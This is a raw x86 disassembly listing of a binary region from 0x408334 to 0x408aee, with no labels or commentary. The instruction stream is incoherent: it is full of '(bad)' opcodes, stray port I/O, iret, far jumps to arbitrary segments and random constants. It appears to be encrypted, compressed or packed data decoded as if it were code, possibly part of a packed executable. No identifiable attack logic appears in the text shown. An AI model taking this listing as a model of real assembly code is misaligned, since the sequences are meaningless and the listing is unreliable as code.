  408334:	cmp    ch,BYTE PTR [ebx]
  408336:	and    edx,esi
  408338:	push   cs
  408339:	mov    ds:0x436ffa5a,eax
  40833e:	cmc    
  40833f:	leave  
  408340:	popf   
  408341:	fistp  WORD PTR [ebx-0x40]
  408344:	idiv   edx
  408346:	mov    ebp,0xf7e4586f
  40834b:	mov    esi,0x841c97f1
  408350:	mov    bl,0x4e
  408352:	add    eax,0x29e6251c
  408357:	aam    0x34
  408359:	push   edi
  40835a:	nop
  40835b:	cmp    al,0x1b
  40835d:	out    0x9e,al
  40835f:	mov    bl,0xcc
  408361:	bound  ebp,QWORD PTR [edi-0x76841bf1]
  408367:	add    BYTE PTR ds:0x689255c6,ah
  40836d:	stc    
  40836e:	mov    ecx,0x3c9f3efb
  408373:	jge    0x4083ca
  408375:	jnp    0x4083b5
  408377:	ret    0x7998
  40837a:	jo     0x408301
  40837c:	and    ch,BYTE PTR [eax+ebx*1]
  40837f:	xchg   esi,eax
  408380:	ds aas 
  408382:	mov    esi,0x8978fda5
  408387:	clc    
  408388:	call   0xcca6:0x3578b2e6
  40838f:	xchg   ebp,eax
  408390:	jmp    0x40833f
  408392:	enter  0xe92d,0x51
  408396:	inc    ebp
  408397:	(bad)  
  408398:	ficomp WORD PTR [edx-0x1d]
  40839b:	test   DWORD PTR [esi-0x1a],esi
  40839e:	mov    dh,0xe7
  4083a0:	ret    0xbf57
  4083a3:	push   edi
  4083a4:	js     0x408379
  4083a6:	ja     0x408329
  4083a8:	jge    0x40834e
  4083aa:	pop    edx
  4083ab:	or     al,0x29
  4083ad:	push   esp
  4083ae:	push   ebx
  4083af:	jno    0x4083cf
  4083b1:	out    0xca,al
  4083b3:	jl     0x408406
  4083b5:	iret   
  4083b6:	sub    BYTE PTR [ecx-0x65061dda],cl
  4083bc:	add    al,BYTE PTR [edx+0x46]
  4083bf:	or     BYTE PTR [ebx],cl
  4083c1:	je     0x4083d3
  4083c3:	mov    ch,0xb8
  4083c5:	dec    ebx
  4083c6:	rol    DWORD PTR [ebx+ebp*8+0x5f6d3808],cl
  4083cd:	xor    BYTE PTR [esi],ah
  4083cf:	in     al,dx
  4083d0:	push   eax
  4083d1:	outs   dx,DWORD PTR ds:[esi]
  4083d2:	pop    ebx
  4083d3:	add    al,0x3b
  4083d5:	pop    eax
  4083d6:	inc    esp
  4083d7:	or     DWORD PTR [esi-0x5b],esp
  4083da:	ins    DWORD PTR es:[edi],dx
  4083db:	adc    al,0xc8
  4083dd:	fcomp  DWORD PTR [edx-0x5a]
  4083e0:	push   esi
  4083e1:	dec    ecx
  4083e2:	xchg   esp,eax
  4083e3:	pop    ss
  4083e4:	iret   
  4083e5:	jg     0x40842c
  4083e7:	add    BYTE PTR [esi],bl
  4083e9:	popa   
  4083ea:	ja     0x4083ee
  4083ec:	(bad)  
  4083ed:	jo     0x4083cd
  4083ef:	inc    esp
  4083f0:	mov    BYTE PTR [esi+0x2],al
  4083f3:	test   edx,eax
  4083f5:	int    0xb2
  4083f7:	mov    edx,0x21e6e121
  4083fc:	lea    ebx,[edi+ebp*8+0x5a950416]
  408403:	mov    ds:0x4fe4e095,eax
  408408:	lock (bad) 
  40840a:	(bad)  
  40840b:	mov    dl,0xd9
  40840d:	add    dh,ch
  40840f:	xor    al,0xec
  408411:	jbe    0x4083bd
  408413:	dec    ebp
  408414:	xlat   BYTE PTR ds:[ebx]
  408415:	add    BYTE PTR [eax+0x1a],bl
  408418:	adc    DWORD PTR [ecx+0x4e],0xffffffe4
  40841c:	jecxz  0x408405
  40841e:	cli    
  40841f:	push   ebx
  408420:	push   ecx
  408421:	pop    edx
  408422:	or     DWORD PTR ds:0xc657449,ebx
  408428:	push   cs
  408429:	scas   al,BYTE PTR es:[edi]
  40842a:	arpl   ax,bp
  40842c:	inc    edx
  40842d:	lahf   
  40842e:	fsub   st,st(1)
  408430:	mov    esi,0xf8bd61c4
  408435:	in     al,0x4a
  408437:	test   DWORD PTR [ebx-0x3],ebp
  40843a:	int3   
  40843b:	xor    al,0xc3
  40843d:	jb     0x408457
  40843f:	mov    ?,WORD PTR [esi]
  408441:	mov    ds:0x6a700db2,eax
  408446:	ds aad 0xce
  408449:	out    0x6c,eax
  40844b:	sub    ebx,DWORD PTR [edx-0x538f1cdc]
  408451:	cli    
  408452:	cmp    ah,BYTE PTR [ecx+ebx*4+0x1a]
  408456:	pop    ebx
  408457:	jmp    0x6074:0xf801d491
  40845e:	jno    0x4083e4
  408460:	mov    dh,0x8a
  408462:	inc    esp
  408463:	and    DWORD PTR [edi],edi
  408465:	leave  
  408466:	sqrtps xmm1,xmm6
  408469:	int3   
  40846a:	gs enter 0xe75e,0xea
  40846f:	xor    BYTE PTR [edx],al
  408471:	and    eax,0xb7c38f6c
  408476:	inc    ebp
  408477:	mov    dh,0x65
  408479:	jle    0x4084d5
  40847b:	clc    
  40847c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40847d:	mov    bh,0xca
  40847f:	mov    ch,0x80
  408481:	push   eax
  408482:	xor    eax,DWORD PTR [ebp+ebx*4+0x3e978bc0]
  408489:	adc    edx,DWORD PTR [eax+edi*2]
  40848c:	pop    esp
  40848d:	xor    DWORD PTR [esp+edx*2+0x45],eax
  408491:	xor    dh,BYTE PTR [edi-0x2bff6f5b]
  408497:	test   BYTE PTR [edx-0xf],ah
  40849a:	mov    ah,cl
  40849c:	retf   
  40849d:	jmp    0xb45a:0x39f09057
  4084a4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4084a5:	mov    al,0x8d
  4084a7:	(bad)  [esi-0x7c7a6210]
  4084ad:	or     DWORD PTR [edx-0x4f],ebx
  4084b0:	ds mov bh,0x60
  4084b3:	leave  
  4084b4:	std    
  4084b5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4084b6:	lahf   
  4084b7:	jo     0x408497
  4084b9:	out    0x92,eax
  4084bb:	iret   
  4084bc:	cmc    
  4084bd:	push   esi
  4084be:	stc    
  4084bf:	sbb    BYTE PTR [esi+0x12daf002],0x49
  4084c6:	push   ebp
  4084c7:	xor    BYTE PTR [esp+eiz*8+0x12],bl
  4084cb:	fnsave [esi-0x39c37e72]
  4084d1:	out    0xc3,al
  4084d3:	adc    BYTE PTR ds:0x5326d1f4,0x67
  4084da:	sub    ch,BYTE PTR [ebp-0x4f]
  4084dd:	test   DWORD PTR [ebx-0x54],ebx
  4084e0:	int3   
  4084e1:	xor    ebp,0x26e0709f
  4084e7:	xor    eax,0x9c5d5f10
  4084ec:	jge    0x4084a6
  4084ee:	fild   QWORD PTR [esi]
  4084f0:	sub    edx,DWORD PTR [ecx-0x5d59cb9e]
  4084f6:	pop    edx
  4084f7:	or     BYTE PTR [ecx],dh
  4084f9:	or     eax,0xe03a74af
  4084fe:	popf   
  4084ff:	test   DWORD PTR [eax-0x4f],edx
  408502:	jo     0x4084b5
  408504:	ds test eax,0x4ffb6bd7
  40850a:	jbe    0x408582
  40850c:	(bad)  
  40850d:	out    0x2a,eax
  40850f:	dec    ecx
  408510:	mov    WORD PTR [edx-0x1b3e37d7],ss
  408516:	shl    DWORD PTR [ebx+0x5f],cl
  408519:	imul   BYTE PTR [edx-0x1b]
  40851c:	(bad)  
  40851d:	fistp  WORD PTR [ebx+0x50]
  408520:	mov    ds:0x7422e48e,al
  408525:	pop    ebp
  408526:	inc    edx
  408527:	xchg   cl,ch
  408529:	jg     0x408583
  40852b:	fdivr  DWORD PTR [ecx+edx*2+0x57]
  40852f:	lds    eax,FWORD PTR [esi+0xc]
  408532:	pop    ebx
  408533:	jl     0x4084e8
  408535:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408536:	int    0x42
  408538:	aam    0xab
  40853a:	mov    ah,0x85
  40853c:	call   0x61c8:0x5ef55381
  408543:	cli    
  408544:	inc    esp
  408545:	outs   dx,BYTE PTR ds:[esi]
  408546:	je     0x408540
  408548:	jle    0x408565
  40854a:	pop    ebx
  40854b:	push   0x5a4ae011
  408550:	fwait
  408551:	xchg   DWORD PTR [ecx+0x3f],ebp
  408554:	dec    eax
  408555:	int3   
  408556:	dec    ebp
  408557:	cwde   
  408558:	push   cs
  408559:	mov    bp,0x78f
  40855d:	add    DWORD PTR [edx],0xffffff87
  408560:	aas    
  408561:	sbb    BYTE PTR [ebp-0x59],0x5e
  408565:	xchg   edx,eax
  408566:	and    al,0xc
  408568:	retf   0xcffd
  40856b:	test   DWORD PTR [eax+eiz*4+0x78],eax
  40856f:	nop
  408570:	add    eax,0x3f62b869
  408575:	lea    edx,[esi]
  408577:	cli    
  408578:	pop    esp
  408579:	add    DWORD PTR [edx-0x574bd3e5],0xa217d985
  408583:	das    
  408584:	ds jmp 0x474ab91e
  40858a:	mov    al,0x80
  40858c:	hlt    
  40858d:	out    0xfe,al
  40858f:	xchg   esi,eax
  408590:	push   ebp
  408591:	xchg   esi,eax
  408592:	sbb    eax,0x1e784305
  408597:	mov    edi,edi
  408599:	ins    DWORD PTR es:[edi],dx
  40859a:	pop    edx
  40859b:	jb     0x40855f
  40859d:	xor    al,0x36
  40859f:	nop
  4085a0:	out    0x17,al
  4085a2:	popf   
  4085a3:	mov    esi,0x760d172
  4085a8:	or     BYTE PTR [esi],ah
  4085aa:	jb     0x408627
  4085ac:	aas    
  4085ad:	inc    ecx
  4085ae:	or     ah,BYTE PTR [edi-0x6ee9e2d4]
  4085b4:	push   ebx
  4085b5:	out    0xb2,eax
  4085b7:	dec    ebx
  4085b8:	clc    
  4085b9:	leave  
  4085ba:	fmul   st,st(2)
  4085bc:	dec    eax
  4085bd:	popa   
  4085be:	in     eax,dx
  4085bf:	out    0xa1,eax
  4085c1:	out    dx,al
  4085c2:	pop    edx
  4085c3:	aam    0x46
  4085c5:	inc    edx
  4085c6:	jo     0x408562
  4085c8:	add    al,0x1c
  4085ca:	je     0x408553
  4085cc:	fisubr WORD PTR [eax-0x35fe9dd1]
  4085d2:	xor    ecx,DWORD PTR [edi+esi*4+0x6]
  4085d6:	pop    edx
  4085d7:	outs   dx,BYTE PTR ds:[esi]
  4085d8:	and    BYTE PTR ds:0xa8c3173,dh
  4085de:	pop    edi
  4085df:	test   DWORD PTR [ebx+0x3fd2487a],ebx
  4085e5:	xor    ecx,edx
  4085e7:	push   ds
  4085e8:	fadd   DWORD PTR gs:[edx-0x2c]
  4085ec:	mov    cl,0xf8
  4085ee:	lock mov ds:0x2a4a98d2,eax
  4085f4:	out    0x41,eax
  4085f6:	call   0x49f5:0x3ca93eac
  4085fd:	aaa    
  4085fe:	fidivr WORD PTR [ebp-0x5ccf07e2]
  408604:	mov    ch,0x51
  408606:	ret    
  408607:	inc    edi
  408608:	xchg   ebx,eax
  408609:	pop    ebp
  40860a:	sbb    bh,BYTE PTR [esi+0x2320f93e]
  408610:	xchg   esp,eax
  408611:	repnz mov WORD PTR [edi+0x34],?
  408615:	out    0xf2,al
  408617:	lea    eax,[edi-0x6594db2b]
  40861d:	lock sbb ecx,DWORD PTR [eax]
  408620:	(bad)  
  408621:	cmp    al,0x5b
  408623:	cs jnp 0x408638
  408626:	pop    ss
  408627:	lea    esi,[edx-0x79]
  40862a:	fiadd  WORD PTR [ebp+0x41a7ce81]
  408630:	(bad)  
  408631:	outs   dx,BYTE PTR ds:[esi]
  408632:	xchg   esp,eax
  408633:	or     ebp,DWORD PTR [edx]
  408635:	pop    ebx
  408636:	pop    edx
  408637:	mov    bh,al
  408639:	lods   eax,DWORD PTR ds:[esi]
  40863a:	imul   ecx,DWORD PTR [edi+0x1a],0xffffffe7
  40863e:	es popa 
  408640:	pop    edx
  408641:	xor    cl,BYTE PTR [edi]
  408643:	fdivp  st(6),st
  408645:	mov    eax,0xd04c2add
  40864a:	pop    esp
  40864b:	out    0xa1,al
  40864d:	xchg   BYTE PTR ds:0x620ac53b,bl
  408653:	scas   al,BYTE PTR es:[edi]
  408654:	push   ss
  408655:	test   BYTE PTR [ebp-0x7c],dh
  408658:	mov    ds:0x3f96c3a2,al
  40865d:	lahf   
  40865e:	pop    ds
  40865f:	push   esi
  408660:	jbe    0x4086a4
  408662:	lds    eax,FWORD PTR [edx+ebp*2]
  408665:	out    0x8e,al
  408667:	mov    dh,0x7e
  408669:	adc    BYTE PTR [esp],ah
  40866c:	sahf   
  40866d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40866e:	xor    DWORD PTR [edi+0x5a7469],esp
  408674:	cs jo  0x4085f7
  408677:	cld    
  408678:	fadd   st,st(5)
  40867a:	dec    ecx
  40867b:	test   DWORD PTR [ebx],ecx
  40867d:	sub    al,0xb3
  40867f:	xor    eax,0x762938
  408684:	lahf   
  408685:	test   al,0xd7
  408687:	adc    DWORD PTR [ebx+0x107541b],esp
  40868d:	out    0xb2,eax
  40868f:	or     ebp,DWORD PTR [eax]
  408691:	xchg   esi,eax
  408692:	pop    DWORD PTR [esi]
  408694:	iret   
  408695:	pop    edi
  408696:	scas   eax,DWORD PTR es:[edi]
  408697:	mov    al,ds:0x6c5bea82
  40869c:	jbe    0x40869c
  40869e:	sbb    ebp,DWORD PTR [ecx+0x11]
  4086a1:	in     eax,0xda
  4086a3:	mov    ah,0xad
  4086a5:	jle    0x4086b8
  4086a7:	mov    ebx,0x36d6f1c
  4086ac:	cmp    DWORD PTR ds:[ecx],esp
  4086af:	mov    esp,0xdf8a3ccb
  4086b4:	sub    ah,bh
  4086b6:	mov    cl,BYTE PTR [eax-0x7f]
  4086b9:	push   es
  4086ba:	dec    eax
  4086bb:	shl    DWORD PTR [esi+0x31],0x99
  4086bf:	cmp    DWORD PTR [esi],0x2ec8a633
  4086c5:	scas   al,BYTE PTR es:[edi]
  4086c6:	daa    
  4086c7:	mov    edi,ds
  4086c9:	out    0x0,al
  4086cb:	dec    esp
  4086cc:	sub    BYTE PTR [eax+0x5d5093c0],ch
  4086d2:	cmp    dh,BYTE PTR [eax-0x6c]
  4086d5:	sbb    BYTE PTR [edx+0x56],0xa0
  4086d9:	jo     0x40865b
  4086db:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4086dc:	mov    ds:0xb98416b8,al
  4086e1:	fild   WORD PTR [edi+0x77553ecb]
  4086e7:	inc    ecx
  4086e8:	pop    es
  4086e9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4086ea:	or     al,0x17
  4086ec:	je     0x4086fa
  4086ee:	cwde   
  4086ef:	(bad)  [edx-0x7c645686]
  4086f5:	data16 loopne 0x4086de
  4086f8:	(bad)  
  4086f9:	std    
  4086fa:	and    eax,0x77d32209
  4086ff:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408700:	push   edi
  408701:	and    al,0x78
  408703:	lea    ecx,[esi]
  408705:	fdivp  st(1),st
  408707:	push   eax
  408708:	ins    BYTE PTR es:[edi],dx
  408709:	push   ds
  40870a:	mov    ebx,0xd29b14e5
  40870f:	popa   
  408710:	aas    
  408711:	xchg   DWORD PTR ds:0x8d3835d2,eax
  408717:	and    DWORD PTR [esi],edi
  408719:	ja     0x4086d4
  40871b:	mov    edi,DWORD PTR [esi+0x48]
  40871e:	dec    ecx
  40871f:	jne    0x408714
  408721:	loope  0x4086d1
  408723:	push   ds
  408724:	push   0x5e07f325
  408729:	cld    
  40872a:	addr16 gs aas 
  40872d:	leave  
  40872e:	rcr    BYTE PTR [esi-0x2a],cl
  408731:	mov    eax,ds:0xe6c847d2
  408736:	push   edx
  408737:	(bad)  
  408738:	loopne 0x408784
  40873a:	aas    
  40873b:	cmp    DWORD PTR [ecx+0x63],edx
  40873e:	fstp   TBYTE PTR [edi]
  408740:	mov    eax,DWORD PTR [edx+0x5b]
  408743:	or     cl,BYTE PTR [ebx]
  408745:	xor    BYTE PTR [esi],ch
  408747:	retf   0x96a0
  40874a:	mov    es,WORD PTR [edx+0x6b50a89]
  408750:	neg    BYTE PTR [esi]
  408752:	push   esp
  408753:	pushf  
  408754:	jg     0x40877a
  408756:	xchg   ebx,eax
  408757:	inc    cl
  408759:	stc    
  40875a:	add    BYTE PTR [esi-0x38],cl
  40875d:	scas   eax,DWORD PTR es:[edi]
  40875e:	xor    al,ah
  408760:	xlat   BYTE PTR ds:[ebx]
  408761:	cmp    ebx,DWORD PTR [ebx-0x1f]
  408764:	ds scas eax,DWORD PTR es:[edi]
  408766:	mov    ebp,0x14075322
  40876b:	test   edx,ecx
  40876d:	out    0x1c,al
  40876f:	stos   DWORD PTR es:[edi],eax
  408770:	push   ecx
  408771:	pop    es
  408772:	int    0x1e
  408774:	or     edx,DWORD PTR [eax]
  408776:	pop    eax
  408777:	cli    
  408778:	add    cl,BYTE PTR [edi+0x5b]
  40877b:	aam    0xea
  40877d:	ret    
  40877e:	xor    BYTE PTR [edi+0xc],0x53
  408782:	mov    dh,0x84
  408784:	xchg   edx,eax
  408785:	and    esp,DWORD PTR [ecx+0x850f26b]
  40878b:	imul   DWORD PTR [edi+0x3cf45a96]
  408791:	aad    0x23
  408793:	jo     0x408739
  408795:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408796:	dec    esi
  408797:	test   DWORD PTR [edx+0x209e16a2],eax
  40879d:	jns    0x4087ae
  40879f:	mov    ebx,0x8c8e69f
  4087a4:	(bad)  
  4087a5:	popa   
  4087a6:	cmp    BYTE PTR [ebp+0x78],ah
  4087a9:	ja     0x40872f
  4087ab:	test   DWORD PTR [edx-0x1c],ebx
  4087ae:	push   edx
  4087af:	push   0x38
  4087b1:	int    0x40
  4087b3:	push   esp
  4087b4:	mov    eax,0x715a38ea
  4087b9:	retf   
  4087ba:	int    0xa4
  4087bc:	lods   al,BYTE PTR ds:[esi]
  4087bd:	sub    al,0x94
  4087bf:	mov    ebp,0x4caff9c
  4087c4:	adc    eax,0xa957d6af
  4087c9:	es pop edx
  4087cb:	(bad)  
  4087cc:	in     al,0xa0
  4087ce:	div    eax
  4087d0:	in     eax,dx
  4087d1:	out    0x10,eax
  4087d3:	js     0x408800
  4087d5:	jle    0x4087f2
  4087d7:	mov    eax,0xe75a4c5a
  4087dc:	mov    ebx,0xc4c426d8
  4087e1:	out    0x78,al
  4087e3:	pop    edi
  4087e4:	int    0xa4
  4087e6:	xor    eax,0x88e65797
  4087eb:	cmp    ch,al
  4087ed:	add    BYTE PTR [esi-0x48c748bf],al
  4087f3:	cmp    edi,DWORD PTR [edi]
  4087f5:	cli    
  4087f6:	pop    esi
  4087f7:	lods   al,BYTE PTR ds:[esi]
  4087f8:	icebp  
  4087f9:	addr16 jbe 0x408874
  4087fc:	out    dx,eax
  4087fd:	aaa    
  4087fe:	xchg   ebx,eax
  4087ff:	stos   DWORD PTR es:[edi],eax
  408800:	mov    esi,0xc845d40
  408805:	stos   BYTE PTR es:[edi],al
  408806:	xor    DWORD PTR [ebp+0x21],esp
  408809:	imul   ebp,DWORD PTR [edx+0x5c],0xf00499ff
  408810:	pushf  
  408811:	sbb    ah,dl
  408813:	mov    dl,BYTE PTR [edx]
  408815:	mov    WORD PTR [edx],ds
  408817:	xor    al,0xb2
  408819:	lock mov eax,ds:0xa6275282
  40881f:	ins    BYTE PTR es:[edi],dx
  408820:	in     eax,0x7f
  408822:	cli    
  408823:	pop    ebx
  408824:	cmp    edx,DWORD PTR [edi]
  408826:	inc    esi
  408827:	push   ss
  408828:	lock and ecx,DWORD PTR ds:0x92e70145
  40882f:	les    eax,FWORD PTR [ecx-0x5b202075]
  408835:	leave  
  408836:	cmc    
  408837:	(bad)  
  408838:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408839:	cmp    bl,BYTE PTR [ebx-0x26]
  40883c:	jne    0x4087e9
  40883e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40883f:	jo     0x408895
  408841:	add    ch,bh
  408843:	mov    ebp,0xbe63fba
  408848:	push   cs
  408849:	xor    al,0x9a
  40884b:	mov    ds:0x23bb33eb,eax
  408850:	mov    ds:0xadd4fb2a,al
  408855:	mov    edx,0x6076865b
  40885a:	shl    BYTE PTR [edi-0x7af120b4],cl
  408860:	push   edx
  408861:	pushf  
  408862:	stos   BYTE PTR es:[edi],al
  408863:	push   ebp
  408864:	cmp    al,0x61
  408866:	cmc    
  408867:	mov    ecx,DWORD PTR [eax-0x2970a4a8]
  40886d:	ins    BYTE PTR es:[edi],dx
  40886e:	arpl   WORD PTR [edi-0x5c],cx
  408871:	fist   DWORD PTR [ebx-0x88a57c]
  408877:	cmp    eax,0xcfa0e53e
  40887c:	add    DWORD PTR [ecx+0x44],0x27
  408880:	sub    eax,0x51e5dae7
  408885:	(bad)  
  408886:	jmp    0x2543:0x258b6d7a
  40888d:	dec    edi
  40888e:	pop    edx
  40888f:	add    dh,BYTE PTR [edi]
  408891:	mov    edi,0xb202a195
  408896:	pop    es
  408897:	test   DWORD PTR [edx+ebp*8],eax
  40889a:	ror    DWORD PTR [edi*2-0x3f137c26],1
  4088a1:	aam    0xdb
  4088a3:	bound  esp,QWORD PTR gs:[ebx-0x24c08a4e]
  4088aa:	retf   0xc4fb
  4088ad:	xchg   edi,eax
  4088ae:	aam    0x88
  4088b0:	push   ss
  4088b1:	or     al,0x6e
  4088b3:	test   cl,cl
  4088b5:	fimul  DWORD PTR [ecx+0x63013f6c]
  4088bb:	ror    DWORD PTR [eax+0x7c],0x13
  4088bf:	popf   
  4088c0:	add    dl,BYTE PTR [edi]
  4088c2:	push   esp
  4088c3:	cmp    dl,al
  4088c5:	mov    ebx,0x18c8420
  4088ca:	cwde   
  4088cb:	daa    
  4088cc:	aas    
  4088cd:	arpl   WORD PTR [ebx-0x2],cx
  4088d0:	lods   al,BYTE PTR ds:[esi]
  4088d1:	adc    BYTE PTR [ebp*2+0x402ee637],dh
  4088d8:	inc    esi
  4088d9:	push   0x45
  4088db:	cmc    
  4088dc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4088dd:	sub    esi,DWORD PTR [edx+0x2a]
  4088e0:	test   al,0x5b
  4088e2:	pop    ebx
  4088e3:	jle    0x4088e6
  4088e5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4088e6:	push   edx
  4088e7:	call   0x850f5d10
  4088ec:	pusha  
  4088ed:	mov    ebp,0xf8ce19c8
  4088f2:	xor    BYTE PTR [edi],0xf2
  4088f5:	addr16 push ebp
  4088f7:	pushf  
  4088f8:	inc    ebp
  4088fa:	jbe    0x408886
  4088fc:	push   edx
  4088fd:	sti    
  4088fe:	inc    eax
  4088ff:	mov    cl,0x57
  408901:	packssdw mm1,QWORD PTR [ecx+eax*4+0x3ed3da72]
  408909:	gs fld QWORD PTR ds:[edx-0xd]
  40890e:	outs   dx,DWORD PTR ds:[esi]
  40890f:	div    DWORD PTR [edx+eiz*8]
  408912:	mov    esi,0x76c12fad
  408917:	and    eax,0xecbf5fd
  40891c:	in     eax,0xb1
  40891e:	jmp    0x9cc0:0x5af04b54
  408925:	push   ss
  408926:	jp     0x408993
  408928:	loopne 0x40890e
  40892a:	fdivr  DWORD PTR [eax+0x3fe169f8]
  408930:	aad    0xa2
  408932:	cmp    ecx,DWORD PTR [ebx-0x27f8a3c7]
  408938:	jg     0x408988
  40893a:	scas   al,BYTE PTR es:[edi]
  40893b:	xchg   DWORD PTR [edi],edi
  40893d:	sub    DWORD PTR [edi],ebx
  40893f:	inc    edx
  408941:	mov    dh,0xa3
  408943:	pop    esi
  408944:	imul   esp,esi,0xffffffc0
  408947:	enter  0xe989,0x5d
  40894b:	ins    DWORD PTR es:[edi],dx
  40894c:	adc    al,0x38
  40894e:	outs   dx,DWORD PTR ds:[esi]
  40894f:	ja     0x40896b
  408951:	mov    ds:0x6ee8be5b,al
  408956:	cdq    
  408957:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408958:	sub    DWORD PTR [edi+0x7c],edi
  40895b:	gs aas 
  40895d:	or     ebp,DWORD PTR [ebx-0x7c]
  408960:	jo     0x4088ef
  408962:	mov    bl,0x13
  408964:	aas    
  408965:	int    0xea
  408967:	stc    
  408968:	lods   al,BYTE PTR ds:[esi]
  408969:	xor    eax,0xe46cac77
  40896e:	inc    eax
  40896f:	push   esi
  408970:	aad    0x73
  408972:	dec    esp
  408973:	adc    al,0xb9
  408975:	es jp  0x4089f0
  408978:	fiadd  WORD PTR [edx]
  40897a:	adc    ebx,edx
  40897c:	aas    
  40897d:	out    dx,eax
  40897e:	mov    ds:0xb0d148a5,eax
  408983:	cmp    ebp,DWORD PTR [ebx+0x11b78ee6]
  408989:	mov    fs,edx
  40898b:	adc    ebp,DWORD PTR ds:0x27410613
  408991:	inc    ecx
  408992:	pop    ebx
  408993:	jbe    0x40897b
  408995:	adc    BYTE PTR [esi+ecx*2+0x7234e7b0],cl
  40899c:	lods   al,BYTE PTR ds:[esi]
  40899d:	fsub   st,st(7)
  40899f:	sub    dl,BYTE PTR [ebx+eax*8+0x4323fe94]
  4089a6:	push   ebp
  4089a7:	retf   0xd29e
  4089aa:	sbb    al,0x56
  4089ac:	(bad)  
  4089ad:	out    0x0,al
  4089af:	sbb    DWORD PTR [ecx-0x62],esp
  4089b2:	jns    0x40894f
  4089b4:	add    DWORD PTR [eax],edi
  4089b6:	pop    edx
  4089b7:	pop    edi
  4089b8:	xchg   edi,eax
  4089b9:	adc    edx,DWORD PTR [eax+eiz*4-0x68]
  4089bd:	inc    ebp
  4089be:	ss enter 0x9982,0x50
  4089c3:	test   DWORD PTR [esp+ebx*2],ebp
  4089c6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4089c7:	(bad)  
  4089c8:	ror    BYTE PTR [esi+0x7d],1
  4089cb:	aad    0x32
  4089cd:	xlat   BYTE PTR ds:[ebx]
  4089ce:	cmp    eax,DWORD PTR [ebx-0x66973cfa]
  4089d4:	fs jne 0x408a11
  4089d7:	cli    
  4089d8:	inc    ebx
  4089d9:	sub    al,0x50
  4089db:	mov    ds:0x84760e6f,al
  4089e0:	adc    ecx,ebp
  4089e2:	ins    DWORD PTR es:[edi],dx
  4089e3:	sahf   
  4089e4:	ds inc edi
  4089e6:	faddp  st(0),st
  4089e8:	pop    edi
  4089e9:	dec    ebp
  4089ea:	push   eax
  4089eb:	jl     0x4089b3
  4089ed:	lahf   
  4089ee:	mov    esi,0x5ec95085
  4089f3:	adc    eax,0x2f6dd4f
  4089f8:	adc    dl,BYTE PTR [ebx+0x148784f8]
  4089fe:	ss jb  0x4089eb
  408a01:	in     al,0x26
  408a03:	addr16 jl 0x4089f9
  408a06:	push   0x7b3e31a0
  408a0b:	mov    edi,0xca75913e
  408a10:	aad    0xc3
  408a12:	sti    
  408a13:	je     0x408a87
  408a15:	in     eax,0xc
  408a17:	mov    ebp,eax
  408a19:	imul   eax,DWORD PTR [ecx+0x63],0x30491662
  408a20:	aas    
  408a21:	sbb    eax,0x6ba7c225
  408a26:	lea    esp,[ecx+edi*1-0x25]
  408a2a:	scas   al,BYTE PTR es:[edi]
  408a2b:	adc    DWORD PTR ss:[esi-0x14],esp
  408a2f:	sahf   
  408a30:	xor    al,0x6b
  408a32:	js     0x408a38
  408a34:	dec    edi
  408a35:	repnz inc esp
  408a37:	call   0x132f:0x425bcd2a
  408a3e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408a3f:	mov    ds:0x84967ab6,al
  408a44:	call   0x23a1b902
  408a49:	mov    edi,0xe7659283
  408a4e:	jo     0x408a36
  408a50:	inc    edx
  408a51:	push   ds
  408a52:	xor    DWORD PTR [edx],edi
  408a54:	push   cs
  408a55:	mov    ds:0xf50b857d,eax
  408a5a:	push   ebx
  408a5b:	test   BYTE PTR [ebp-0x1],al
  408a5e:	stos   BYTE PTR es:[edi],al
  408a5f:	imul   eax,DWORD PTR [ecx],0x3c74d1e1
  408a65:	aaa    
  408a66:	adc    ebx,esp
  408a68:	loop   0x408ab7
  408a6a:	imul   BYTE PTR [eax-0x272531cd]
  408a70:	cli    
  408a71:	mov    dl,0xe1
  408a73:	test   DWORD PTR ds:0xdb593cee,edx
  408a79:	shr    BYTE PTR [esi+0x4ff626b9],1
  408a7f:	es aas 
  408a81:	dec    ebp
  408a82:	ficomp WORD PTR [ebp-0x4f]
  408a85:	iret   
  408a86:	mov    al,ds:0xeab610e1
  408a8b:	test   DWORD PTR [edi+0xb],eax
  408a8e:	mov    eax,ds:0x626f23ea
  408a93:	cmc    
  408a94:	xchg   esp,eax
  408a95:	movs   BYTE PTR es:[di],BYTE PTR ds:[si]
  408a97:	adc    eax,0x4b878fc1
  408a9c:	mov    eax,0x3cdd979c
  408aa1:	push   dx
  408aa3:	test   bh,0x5d
  408aa6:	jmp    0x408a3f
  408aa8:	(bad)  
  408aa9:	and    esp,DWORD PTR [edx+0x5c08f965]
  408aaf:	push   ss
  408ab0:	loope  0x408a98
  408ab2:	inc    ecx
  408ab3:	inc    ecx
  408ab4:	pop    ds
  408ab5:	xchg   edx,eax
  408ab6:	sub    BYTE PTR [eax],bl
  408ab8:	aas    
  408ab9:	jge    0x408b3a
  408abb:	mov    ecx,0x14785d0e
  408ac0:	ds stos DWORD PTR es:[edi],eax
  408ac2:	sub    eax,0x7b0f21c5
  408ac7:	and    al,0x21
  408ac9:	xchg   esp,eax
  408aca:	pop    eax
  408acb:	loop   0x408b0c
  408acd:	or     DWORD PTR [esi-0x4bf03b50],ebx
  408ad3:	pop    edi
  408ad4:	bound  edi,QWORD PTR [ebx]
  408ad6:	mov    ebp,0x1a073ea7
  408adb:	xor    DWORD PTR [esp+ecx*4-0x19b9ecf1],ebp
  408ae2:	cli    
  408ae3:	jl     0x408b4c
  408ae5:	jecxz  0x408a9f
  408ae7:	xchg   edx,eax
  408ae8:	sub    ch,BYTE PTR [eax+0x55d77062]
  408aee:	push   ss
